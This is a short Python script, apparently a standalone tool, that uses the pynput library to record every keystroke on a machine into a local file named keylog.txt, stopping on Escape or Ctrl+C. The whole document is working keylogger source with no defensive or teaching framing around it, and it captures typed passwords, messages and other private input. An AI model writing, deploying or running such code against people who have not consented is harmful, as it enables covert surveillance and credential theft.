from pynput import keyboard
import signal
import sys

# The file where the keystrokes will be saved
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" {key} ")

def on_release(key):
    # Stop the listener when the escape key is pressed
    if key == keyboard.Key.esc:
        return False

def signal_handler(sig, frame):
    print('Stopping keylogger...')
    sys.exit(0)

# Set up signal handler for graceful exit
signal.signal(signal.SIGINT, signal_handler)

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
